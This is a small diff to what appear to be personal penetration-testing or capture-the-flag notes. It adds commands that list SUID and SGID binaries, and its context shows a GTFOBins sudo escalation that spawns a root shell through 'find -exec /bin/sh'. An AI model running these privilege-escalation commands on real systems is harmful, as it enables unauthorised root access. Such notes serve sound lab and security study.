@@ -178,6 +178,8 @@ ________________________________________________________________________________
 ______________________________________________________________________________________________________________
 ## Sudo -l when on the RoundSensor and GTFObins the find command
     https://gtfobins.github.io/
+    find / -type f -perm /4000 -ls 2>/dev/null
+    find / -type f -perm /2000 -ls 2>/dev/null
 ### Escalates privileges to root
     sudo find . -exec /bin/sh \; -quit
 ______________________________________________________________________________________________________________
